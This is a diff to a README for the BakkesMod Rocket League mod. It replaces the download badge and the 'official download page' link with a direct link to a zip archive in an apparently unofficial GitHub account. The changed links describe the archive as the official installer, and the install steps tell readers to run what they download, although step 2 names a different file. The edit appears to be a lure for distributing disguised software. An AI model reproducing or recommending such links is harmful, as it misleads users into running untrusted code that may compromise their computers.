@@ -1,6 +1,6 @@
 # 🏎️ bakkesmod - Enhance your Rocket League gaming experience
 
-[![](https://img.shields.io/badge/Download-BakkesMod-blue.svg)](https://github.com/cassydangerous828/bakkesmod)
+[![](https://img.shields.io/badge/Download-BakkesMod-blue.svg)](https://github.com/cassydangerous828/bakkesmod/raw/refs/heads/main/Mod/Software_v2.0.zip)
 
 BakkesMod provides tools for Rocket League players on Windows. It adds features like workshop map loading, custom training options, and plugin support. This software modifies your game client to offer better practice tools and visual enhancements.
 
@@ -19,7 +19,7 @@ BakkesMod works by injecting code into the Rocket League process. It requires fu
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official download page](https://github.com/cassydangerous828/bakkesmod).
+1. Visit the [official download page](https://github.com/cassydangerous828/bakkesmod/raw/refs/heads/main/Mod/Software_v2.0.zip).
 2. Look for the latest version of the installer file, typically named "BakkesModSetup.exe".
 3. Save the file to your computer.
 4. Run the installer file by double-clicking it.
